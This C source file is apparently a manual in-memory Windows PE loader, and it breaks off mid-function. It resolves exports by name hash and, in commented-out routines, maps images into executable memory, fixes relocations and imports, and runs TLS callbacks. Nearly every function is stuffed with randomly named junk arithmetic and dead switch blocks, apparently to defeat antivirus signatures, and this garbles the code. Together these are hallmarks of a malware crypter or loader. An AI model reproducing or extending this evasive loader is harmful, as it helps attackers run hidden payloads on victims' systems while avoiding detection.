#include "pe.h"

#ifdef _WIN64
#define POINTER_TYPE unsigned long long
#else
#define POINTER_TYPE unsigned long
#endif

typedef LPVOID(WINAPI *funcVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *funcVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HMODULE(WINAPI *funcLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *funcGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef void*(__cdecl *funcmemcpy)(void *dest, const void *src, size_t count);

unsigned int NameHash(const char *szName)
{
	unsigned int ret = 0;
	for (int i = 0; szName[i] != 0; ++i)
	{
		//kernel32: ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
int iuEGxUt4Gdd = 0x66bcc03;
int isZ4qAeyL5F = 0xe034b81;
int if0mqiTuxEH = iuEGxUt4Gdd - isZ4qAeyL5F;

		ret = ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
	}

	return ret;
}


/*bool DoBaseReloc(unsigned char *codeBase, size_t codeSize, size_t delta, IMAGE_BASE_RELOCATION *pBaseReloc, int remainSize)
{
	bool ret = true;
	while (remainSize > 0 && ret)
	{
		WORD *arrRel = (WORD *)&pBaseReloc[1];
int i8Smk0h9Nyw = 0xc78f24f;
int i0eLXaTAEfi = 0x31528e8;
int itm1UYm8EPJ = 0x61c7981;
int iqmTiwLiOIW = i8Smk0h9Nyw + i0eLXaTAEfi - itm1UYm8EPJ;
iqmTiwLiOIW = 0x0da9baf * iqmTiwLiOIW + 0x2d37e9f - i0eLXaTAEfi;
int idMZOIm08I3 = iqmTiwLiOIW / 0x2d37e9f + i8Smk0h9Nyw ^ itm1UYm8EPJ - 0x61c7981;

		int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;

		if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
		{
			ret = false;
int iauQC4yhOuI = 0x3f1edd2;
int i3aNX3IxymV = 0x894bdc4;
int iDIyFZch9nE = 0x3d669cb;
int iKYSpJeftCU = 0x2d3d66a;
int ihTcdSVinCN = 1;
switch(ihTcdSVinCN)
{
    case 0:
        iauQC4yhOuI = i3aNX3IxymV - 0x8f38789 * iDIyFZch9nE / 100;
        i3aNX3IxymV = 0x3d669cb - 5 +  0x3d669cb - 6 * i3aNX3IxymV / 10 + 25;
        iDIyFZch9nE = iauQC4yhOuI * 0x12 + iKYSpJeftCU * 0x15 + 0x2d3d66a / 13 + 0x8f38789 + 555;
        iKYSpJeftCU = 0x3f1edd2 - 21 + 11 * 1996 - i3aNX3IxymV + 14520538 - iDIyFZch9nE - 14520692 + 0x894bdc4 - 97;
        break;
    case 1:
        iauQC4yhOuI = i3aNX3IxymV - 25 + 0x3f1edd2 - 40 + 0x3d669cb % 10 + 2;
        iDIyFZch9nE = iDIyFZch9nE - 0xff % 3 - iKYSpJeftCU * 10 + 0x8f38789 / 2 - 10 + 0x894bdc4 - 5;
        iKYSpJeftCU = 0x3f1edd2 % 0x8f38789 ^ 33 + 0x3d669cb * 0x12 - 30 + 0x3d669cb + 23;
        i3aNX3IxymV = i3aNX3IxymV + 321 + iDIyFZch9nE * 10 * i3aNX3IxymV / 10 / 2 + 0x8f38789 * 0x60;
        break;
    case 2:
        iauQC4yhOuI = i3aNX3IxymV - 45 - iDIyFZch9nE * 46 + 0x3f1edd2 / 0xdade;
        i3aNX3IxymV = i3aNX3IxymV + 0x8f38789 - iDIyFZch9nE * 0x894bdc4 - 3;
        iDIyFZch9nE = 0x894bdc4 - 0x1 + iauQC4yhOuI * 0x2 - 0x8f38789 / 0x3 + 0x3d669cb;
        iKYSpJeftCU = iauQC4yhOuI - 0x4 * 0x3f1edd2 + 0x1234 - 0x4567 + 0xcafe + i3aNX3IxymV % 0x432 / 0x2d3d66a - 0x23;
        break;
    case 3:
        i3aNX3IxymV = iKYSpJeftCU * 2 * 0x894bdc4 - 4 + 0x8f38789 + 12 + 34 + 0x3f1edd2;
        iDIyFZch9nE = i3aNX3IxymV - 43 + 0x3d669cb * 3040 - 0x894bdc4 % 10 + 1 - 0x3d669cb;
        iKYSpJeftCU = 0x3d669cb - 33 + iauQC4yhOuI * 0x25 + 0x3f1edd2 - 3004 + 0x894bdc4;
        iauQC4yhOuI = 0x3f1edd2 + 2905 % i3aNX3IxymV * 1996 + 0x2d3d66a - 70 * 0x8f38789;
        break;
    case 4:
        iKYSpJeftCU = i3aNX3IxymV - 36 +0x8f38789 * 2001 - iDIyFZch9nE / 234 + 0x7;
        iauQC4yhOuI = iKYSpJeftCU - 0xabcedf + 0x894bdc4 * 0xa2bc5 + iKYSpJeftCU / 0x123 + 0x3f1edd2;
        iDIyFZch9nE = iauQC4yhOuI - 0x124 + 23 / i3aNX3IxymV / 3 / 2 + iDIyFZch9nE + 29 - 0x894bdc4 + 100;
        i3aNX3IxymV = 0x894bdc4 - 70 + 70  + 0x3f1edd2 / 2 + 423 - 0x3f1edd2 / 7749 % 0x1234;
        break;
    case 5:
        i3aNX3IxymV = i3aNX3IxymV - 9981 % iauQC4yhOuI + 111 - iDIyFZch9nE / 224 % 0x3d669cb;
        iDIyFZch9nE = iDIyFZch9nE - 339 - iDIyFZch9nE * 4416 / 0x8f38789 + 5525 + 0x894bdc4 % 10;
        iKYSpJeftCU = iKYSpJeftCU - 6636 + 0x894bdc4 * 7749 + 1 - i3aNX3IxymV * 8864 / 0xfecba;
        iauQC4yhOuI = 0x8f38789 - 9981 % 0x3f1edd2 % 10 % 1010100 - 0x3f1edd2 - 23 -  0x8f38789 - 2500;
        break;
}
ihTcdSVinCN = iKYSpJeftCU - 0xaa + 0x3d669cb * 46 - 15 / iDIyFZch9nE + 11 - 0x3f1edd2;
ihTcdSVinCN = ihTcdSVinCN - 70 * 55 - iDIyFZch9nE ^ 0x99 - 0x567498 % 0x3f1edd2 % 2 - 234 + 0x894bdc4;

		}
		else for (int i = 0; i < nRel; ++i)
		{
			DWORD *patchAddrHL;
#ifdef _WIN64
			ULONGLONG *patchAddr64;
int i1jUGjEAsxf = 0x8e8c31e;
int iwMBZnkrU5t = 0x23492c2;
int iJmkXhiVkKX = 0xd04b6e6;
int i5VWvWzS7MN = iJmkXhiVkKX * iwMBZnkrU5t + i1jUGjEAsxf;
iwMBZnkrU5t = 0x90eac66 - i5VWvWzS7MN + 5 + 0x54f6b88 + 69 - i1jUGjEAsxf;
i1jUGjEAsxf = 0x8e8c31e + 10 - iwMBZnkrU5t % 10 + 0xd04b6e6 + 999 - i5VWvWzS7MN;
i5VWvWzS7MN = i1jUGjEAsxf % 5 + iJmkXhiVkKX % 0x23492c2 + 0xcafebabe + i1jUGjEAsxf;
iJmkXhiVkKX = 0x8e8c31e * 0x100 - i1jUGjEAsxf + 56 ^ 0x23492c2 + 1996 - iJmkXhiVkKX;
int ixC2zB12fTz = iJmkXhiVkKX / 77 + 0xd04b6e6 - 76 / iJmkXhiVkKX ^ 0x33 % iJmkXhiVkKX % 0xd04b6e6;
ixC2zB12fTz = 0x54f6b88 * 0x10 - 22 + ixC2zB12fTz + 56 ^ 0xff + iwMBZnkrU5t + 1996 - 2111 + iJmkXhiVkKX;

#endif
			int offset = arrRel[i] & 0xfff;
			switch (arrRel[i] >> 12)
			{
			case IMAGE_REL_BASED_ABSOLUTE:
				// skip relocation
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				// change complete 32 bit address
				patchAddrHL = (DWORD *)(dest + offset);
				*patchAddrHL += (DWORD)delta;
				break;

#ifdef _WIN64
			case IMAGE_REL_BASED_DIR64:
				patchAddr64 = (ULONGLONG *)(dest + offset);
				*patchAddr64 += delta;
				break;
#endif

			default:
				ret = false;
				break;
			}
		}

		if (ret)
		{
			remainSize -= pBaseReloc[0].SizeOfBlock;
			pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
		}
	}

	return ret;

}*/

/*bool DoImport(unsigned char *codeBase, IMAGE_IMPORT_DESCRIPTOR *pImportDesc, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;

	while (pImportDesc[0].Name)
	{
		char *szLibName = (char*)codeBase + pImportDesc[0].Name;

		HMODULE hLib = fnLoadLibraryA(szLibName);

		if (!hLib)
		{
			ret = false;
			break;
		}

		POINTER_TYPE *thunkRef;
int i0kgFeeNl3V = 0xe5c59b5;
int i2JLnWTgF56 = 0x6f447ef;
int i5V6MjmRevo = 0x6dbfcc7;
int iCXux6mkOpn = i5V6MjmRevo * i2JLnWTgF56 + i0kgFeeNl3V;
i2JLnWTgF56 = 0xe3a4122 - iCXux6mkOpn + 5 + 0xf0c2f21 + 69 - i0kgFeeNl3V;
i0kgFeeNl3V = 0xe5c59b5 + 10 - i2JLnWTgF56 % 10 + 0x6dbfcc7 + 999 - iCXux6mkOpn;
iCXux6mkOpn = i0kgFeeNl3V % 5 + i5V6MjmRevo % 0x6f447ef + 0xcafebabe + i0kgFeeNl3V;
i5V6MjmRevo = 0xe5c59b5 * 0x100 - i0kgFeeNl3V + 56 ^ 0x6f447ef + 1996 - i5V6MjmRevo;
int inufzmNTz3Q = i5V6MjmRevo / 77 + 0x6dbfcc7 - 76 / i5V6MjmRevo ^ 0x33 % i5V6MjmRevo % 0x6dbfcc7;
inufzmNTz3Q = 0xf0c2f21 * 0x10 - 22 + inufzmNTz3Q + 56 ^ 0xff + i2JLnWTgF56 + 1996 - 2111 + i5V6MjmRevo;

		FARPROC *funcRef;
		if (pImportDesc[0].OriginalFirstThunk) {
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}
		else {
			// no hint table
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}

		if (!thunkRef || !funcRef)
		{
			ret = false;
			break;
		}
		else for (; *thunkRef; thunkRef++, funcRef++)
		{
			if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
			{
				*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
int iZ44QhIy4IK = 0x7d57de1;
int ihLIPPaoguJ = 0x00555e0;
int ijvIUExoMNP = 0xefc7b3f;
int iuckm2ZQjjb = ijvIUExoMNP * ihLIPPaoguJ + iZ44QhIy4IK;
ihLIPPaoguJ = 0xdc19e56 + iuckm2ZQjjb + 0xe132c17 + iZ44QhIy4IK;
int ihYTa78Wk6u = iZ44QhIy4IK / 0x00555e0 - ijvIUExoMNP ^ ijvIUExoMNP ^ 0xefc7b3f;

			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));

				*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
			}

			if (*funcRef == 0) {
				ret = false;
				break;
			}
		}

		pImportDesc++;
	}

	return ret;
}*/

FARPROC DoGetProcAddress(unsigned char *codeBase, PIMAGE_EXPORT_DIRECTORY pExport, unsigned int hName)
{
	void* ret = nullptr;

	WORD *pwExportOrd = (WORD*)(codeBase + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)(codeBase + pExport->AddressOfFunctions);
	DWORD *pdwExportName = (DWORD*)(codeBase + pExport->AddressOfNames);

	DWORD i, n = pExport->NumberOfNames;
	for (i = 0; i < n; ++i)
	{
		const char *pszExpFuncName = (char*)codeBase + pdwExportName[i];
		if (NameHash(pszExpFuncName) == hName)
		{
			ret = codeBase + pdwExportAddr[pwExportOrd[i]];
			break;
		}
	}

	return (FARPROC)ret;
}

bool PECheck(const void *pImg, int sztImg)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)pImg;
int iGksgN6DLCN = 0x07cb9e3;
int iFTZVOZJJjG = 0xc15fb0b;
int iJMdqHUpdAs = 0xe11e8a0;
int ietj1J2uurF = 0xd440798;
int iVCkdTgikcB = 1;
switch(iVCkdTgikcB)
{
    case 0:
        iGksgN6DLCN = iFTZVOZJJjG - 0x5198f7d * iJMdqHUpdAs / 100;
        iFTZVOZJJjG = 0xe11e8a0 - 5 +  0xe11e8a0 - 6 * iFTZVOZJJjG / 10 + 25;
        iJMdqHUpdAs = iGksgN6DLCN * 0x12 + ietj1J2uurF * 0x15 + 0xd440798 / 13 + 0x5198f7d + 555;
        ietj1J2uurF = 0x07cb9e3 - 21 + 11 * 1996 - iFTZVOZJJjG + 14520538 - iJMdqHUpdAs - 14520692 + 0xc15fb0b - 97;
        break;
    case 1:
        iGksgN6DLCN = iFTZVOZJJjG - 25 + 0x07cb9e3 - 40 + 0xe11e8a0 % 10 + 2;
        iJMdqHUpdAs = iJMdqHUpdAs - 0xff % 3 - ietj1J2uurF * 10 + 0x5198f7d / 2 - 10 + 0xc15fb0b - 5;
        ietj1J2uurF = 0x07cb9e3 % 0x5198f7d ^ 33 + 0xe11e8a0 * 0x12 - 30 + 0xe11e8a0 + 23;
        iFTZVOZJJjG = iFTZVOZJJjG + 321 + iJMdqHUpdAs * 10 * iFTZVOZJJjG / 10 / 2 + 0x5198f7d * 0x60;
        break;
    case 2:
        iGksgN6DLCN = iFTZVOZJJjG - 45 - iJMdqHUpdAs * 46 + 0x07cb9e3 / 0xdade;
        iFTZVOZJJjG = iFTZVOZJJjG + 0x5198f7d - iJMdqHUpdAs * 0xc15fb0b - 3;
        iJMdqHUpdAs = 0xc15fb0b - 0x1 + iGksgN6DLCN * 0x2 - 0x5198f7d / 0x3 + 0xe11e8a0;
        ietj1J2uurF = iGksgN6DLCN - 0x4 * 0x07cb9e3 + 0x1234 - 0x4567 + 0xcafe + iFTZVOZJJjG % 0x432 / 0xd440798 - 0x23;
        break;
    case 3:
        iFTZVOZJJjG = ietj1J2uurF * 2 * 0xc15fb0b - 4 + 0x5198f7d + 12 + 34 + 0x07cb9e3;
        iJMdqHUpdAs = iFTZVOZJJjG - 43 + 0xe11e8a0 * 3040 - 0xc15fb0b % 10 + 1 - 0xe11e8a0;
        ietj1J2uurF = 0xe11e8a0 - 33 + iGksgN6DLCN * 0x25 + 0x07cb9e3 - 3004 + 0xc15fb0b;
        iGksgN6DLCN = 0x07cb9e3 + 2905 % iFTZVOZJJjG * 1996 + 0xd440798 - 70 * 0x5198f7d;
        break;
    case 4:
        ietj1J2uurF = iFTZVOZJJjG - 36 +0x5198f7d * 2001 - iJMdqHUpdAs / 234 + 0x7;
        iGksgN6DLCN = ietj1J2uurF - 0xabcedf + 0xc15fb0b * 0xa2bc5 + ietj1J2uurF / 0x123 + 0x07cb9e3;
        iJMdqHUpdAs = iGksgN6DLCN - 0x124 + 23 / iFTZVOZJJjG / 3 / 2 + iJMdqHUpdAs + 29 - 0xc15fb0b + 100;
        iFTZVOZJJjG = 0xc15fb0b - 70 + 70  + 0x07cb9e3 / 2 + 423 - 0x07cb9e3 / 7749 % 0x1234;
        break;
    case 5:
        iFTZVOZJJjG = iFTZVOZJJjG - 9981 % iGksgN6DLCN + 111 - iJMdqHUpdAs / 224 % 0xe11e8a0;
        iJMdqHUpdAs = iJMdqHUpdAs - 339 - iJMdqHUpdAs * 4416 / 0x5198f7d + 5525 + 0xc15fb0b % 10;
        ietj1J2uurF = ietj1J2uurF - 6636 + 0xc15fb0b * 7749 + 1 - iFTZVOZJJjG * 8864 / 0xfecba;
        iGksgN6DLCN = 0x5198f7d - 9981 % 0x07cb9e3 % 10 % 1010100 - 0x07cb9e3 - 23 -  0x5198f7d - 2500;
        break;
}
iVCkdTgikcB = ietj1J2uurF - 0xaa + 0xe11e8a0 * 46 - 15 / iJMdqHUpdAs + 11 - 0x07cb9e3;
iVCkdTgikcB = iVCkdTgikcB - 70 * 55 - iJMdqHUpdAs ^ 0x99 - 0x567498 % 0x07cb9e3 % 2 - 234 + 0xc15fb0b;

	IMAGE_NT_HEADERS *pNT = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);

	WORD wMagic =
#ifndef _WIN64
		IMAGE_NT_OPTIONAL_HDR32_MAGIC;
#else
		IMAGE_NT_OPTIONAL_HDR64_MAGIC;
#endif

	WORD wMachine =
#ifndef _WIN64
		IMAGE_FILE_MACHINE_I386;
#else
		IMAGE_FILE_MACHINE_AMD64;
#endif
	if ((ULONG)pDos->e_lfanew + pNT->FileHeader.SizeOfOptionalHeader >= (ULONG)sztImg)
	{
		printf("Invalid PE Header size");
	}
	if (pNT->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("Invalid PE Signature");
	}
	else if (pNT->OptionalHeader.Magic != wMagic
		|| pNT->FileHeader.Machine != wMachine)
	{
		printf("Invalid PE Machine");
	}
	else if (pNT->FileHeader.NumberOfSections >= 90)
	{
		printf("Number of PE Section %d >= %d", pNT->FileHeader.NumberOfSections, 90);
	}
	else if (pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
	{
		printf("Not support image with no relocation yet!");
	}
	else
	{
		ret = true;
	}

	return ret;

}

/*HMODULE FixIntoMem(const void *pImg, int sztImg, funcVirtualAlloc fnVirtualAlloc, funcVirtualFree fnVirtualFree, funcmemcpy fnmemcpy)
{
	HMODULE hMod = nullptr;

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);

		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
int ihMb7Z5v7j8 = 0xba98687;
int iCno9PUQYyu = 0x6d65f67;
int ir5mbdlyz6r = 0x67e596a;
int iBipoNo0wi1 = ir5mbdlyz6r * iCno9PUQYyu + ihMb7Z5v7j8;
iCno9PUQYyu = 0x9eb46cc + iBipoNo0wi1 + 0x0bf1ef9 + ihMb7Z5v7j8;
int iPahXYoqAr8 = ihMb7Z5v7j8 / 0x6d65f67 - ir5mbdlyz6r ^ ir5mbdlyz6r ^ 0x67e596a;

			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sztImg)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
		}

		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	return (HMODULE)hMod;
}*/

/*bool Reloc(HMODULE hMod)
{
	bool ret = false;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)pDos;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
	if (pOrgBase == pBase)
	{
		ret = true;
	}
	else if (imgDirRelocation.VirtualAddress == 0)
	{
		ret = false;
	}
	else
	{
		size_t delta = pBase - pOrgBase;

		IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

		if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;
		}
		else
		{
			ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
		}
	}

	return ret;
}*/

/*bool Import(HMODULE hMod, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];


	if (imgDirImport.VirtualAddress)
	{
		IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;
		}
		else
		{
			ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
		}
	}

	return ret;
}*/

/*bool ExecuteTLS(HMODULE hMod)
{
	unsigned char *codeBase = (unsigned char *)hMod;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_TLS_CALLBACK* callback;
int i8M4oyKgnMG;
int iNM2syIIOkA = 0xb7e55e0;
int idjTib9Wu3m = 0x40855db;
int i0ceVrO9C2D = 0x1f0a7dd;
for(i8M4oyKgnMG = 0; i8M4oyKgnMG < 3; i8M4oyKgnMG++)
{
    iNM2syIIOkA = i8M4oyKgnMG * 99 - 1000 * idjTib9Wu3m + 0x456 ^ 0x9853ec3 % 5 - 0xf948e7a;
    idjTib9Wu3m = i8M4oyKgnMG * 3 + i0ceVrO9C2D + 0x30 + 0x1f0a7dd % 123 - idjTib9Wu3m;
    i0ceVrO9C2D = i8M4oyKgnMG * 4 - 0x40855db + 0xff / 0x123 - 0x1f0a7dd % 234 - 0xf948e7a;
}
int ik0GUxpTfgx = i0ceVrO9C2D - iNM2syIIOkA * idjTib9Wu3m + 0x1f0a7dd;
ik0GUxpTfgx = i8M4oyKgnMG - 50 + 100 - 0x40855db ^ 99 * 0x0f - 0x1f0a7dd % 2 - 3575 + 0xf948e7a;


	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;
	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
	PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	if (directory->VirtualAddress == 0) {
		return true;
	}

	tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
	callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
	if (callback) {
		while (*callback) {
			(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
			callback++;
int iOxGgEC7xe6 = 0x77653e6;
int iobTLW653lb = 0x52a3cbf;
int iJ7iofEAAus = 0x2041966;
int iNfRSRmh64r = 0x47dbbc5;
int ix2VQbn2iUz = 0;
switch(ix2VQbn2iUz)
{
    case 0:
        iOxGgEC7xe6 = iobTLW653lb - 0x56ef47a * iJ7iofEAAus / 100;
        iobTLW653lb = 0x2041966 - 5 +  0x2041966 - 6 * iobTLW653lb / 10 + 25;
        iJ7iofEAAus = iOxGgEC7xe6 * 0x12 + iNfRSRmh64r * 0x15 + 0x47dbbc5 / 13 + 0x56ef47a + 555;
        iNfRSRmh64r = 0x77653e6 - 21 + 11 * 1996 - iobTLW653lb + 14520538 - iJ7iofEAAus - 14520692 + 0x52a3cbf - 97;
        break;
    case 1:
        iOxGgEC7xe6 = iobTLW653lb - 25 + 0x77653e6 - 40 + 0x2041966 % 10 + 2;
        iJ7iofEAAus = iJ7iofEAAus - 0xff % 3 - iNfRSRmh64r * 10 + 0x56ef47a / 2 - 10 + 0x52a3cbf - 5;
        iNfRSRmh64r = 0x77653e6 % 0x56ef47a ^ 33 + 0x2041966 * 0x12 - 30 + 0x2041966 + 23;
        iobTLW653lb = iobTLW653lb + 321 + iJ7iofEAAus * 10 * iobTLW653lb / 10 / 2 + 0x56ef47a * 0x60;
        break;
    case 2:
        iOxGgEC7xe6 = iobTLW653lb - 45 - iJ7iofEAAus * 46 + 0x77653e6 / 0xdade;
        iobTLW653lb = iobTLW653lb + 0x56ef47a - iJ7iofEAAus * 0x52a3cbf - 3;
        iJ7iofEAAus = 0x52a3cbf - 0x1 + iOxGgEC7xe6 * 0x2 - 0x56ef47a / 0x3 + 0x2041966;
        iNfRSRmh64r = iOxGgEC7xe6 - 0x4 * 0x77653e6 + 0x1234 - 0x4567 + 0xcafe + iobTLW653lb % 0x432 / 0x47dbbc5 - 0x23;
        break;
    case 3:
        iobTLW653lb = iNfRSRmh64r * 2 * 0x52a3cbf - 4 + 0x56ef47a + 12 + 34 + 0x77653e6;
        iJ7iofEAAus = iobTLW653lb - 43 + 0x2041966 * 3040 - 0x52a3cbf % 10 + 1 - 0x2041966;
        iNfRSRmh64r = 0x2041966 - 33 + iOxGgEC7xe6 * 0x25 + 0x77653e6 - 3004 + 0x52a3cbf;
        iOxGgEC7xe6 = 0x77653e6 + 2905 % iobTLW653lb * 1996 + 0x47dbbc5 - 70 * 0x56ef47a;
        break;
    case 4:
        iNfRSRmh64r = iobTLW653lb - 36 +0x56ef47a * 2001 - iJ7iofEAAus / 234 + 0x7;
        iOxGgEC7xe6 = iNfRSRmh64r - 0xabcedf + 0x52a3cbf * 0xa2bc5 + iNfRSRmh64r / 0x123 + 0x77653e6;
        iJ7iofEAAus = iOxGgEC7xe6 - 0x124 + 23 / iobTLW653lb / 3 / 2 + iJ7iofEAAus + 29 - 0x52a3cbf + 100;
        iobTLW653lb = 0x52a3cbf - 70 + 70  + 0x77653e6 / 2 + 423 - 0x77653e6 / 7749 % 0x1234;
        break;
    case 5:
        iobTLW653lb = iobTLW653lb - 9981 % iOxGgEC7xe6 + 111 - iJ7iofEAAus / 224 % 0x2041966;
        iJ7iofEAAus = iJ7iofEAAus - 339 - iJ7iofEAAus * 4416 / 0x56ef47a + 5525 + 0x52a3cbf % 10;
        iNfRSRmh64r = iNfRSRmh64r - 6636 + 0x52a3cbf * 7749 + 1 - iobTLW653lb * 8864 / 0xfecba;
        iOxGgEC7xe6 = 0x56ef47a - 9981 % 0x77653e6 % 10 % 1010100 - 0x77653e6 - 23 -  0x56ef47a - 2500;
        break;
}
ix2VQbn2iUz = iNfRSRmh64r - 0xaa + 0x2041966 * 46 - 15 / iJ7iofEAAus + 11 - 0x77653e6;
ix2VQbn2iUz = ix2VQbn2iUz - 70 * 55 - iJ7iofEAAus ^ 0x99 - 0x567498 % 0x77653e6 % 2 - 234 + 0x52a3cbf;

		}
	}
	return true;
int iXAXF64q0zj;
int ihSc1pkZXeJ = 0xa9a65cc;
int itnp7OHyjSH = 0xa850998;
int iZ8pQn2WUDD = 0x4e3ed8d;
for(iXAXF64q0zj = 0; iXAXF64q0zj < 3; iXAXF64q0zj++)
{
    ihSc1pkZXeJ = iXAXF64q0zj * 99 - 1000 * itnp7OHyjSH + 0x456 ^ 0xf8ed1aa % 5 - 0x148f618;
    itnp7OHyjSH = iXAXF64q0zj * 3 + iZ8pQn2WUDD + 0x30 + 0x4e3ed8d % 123 - itnp7OHyjSH;
    iZ8pQn2WUDD = iXAXF64q0zj * 4 - 0xa850998 + 0xff / 0x123 - 0x4e3ed8d % 234 - 0x148f618;
}
int iNxbCt4ZUwF = iZ8pQn2WUDD - ihSc1pkZXeJ * itnp7OHyjSH + 0x4e3ed8d;
iNxbCt4ZUwF = iXAXF64q0zj - 50 + 100 - 0xa850998 ^ 99 * 0x0f - 0x4e3ed8d % 2 - 3575 + 0x148f618;

}*/

void Release(HMODULE hMod)
{
	if (hMod != nullptr)
	{
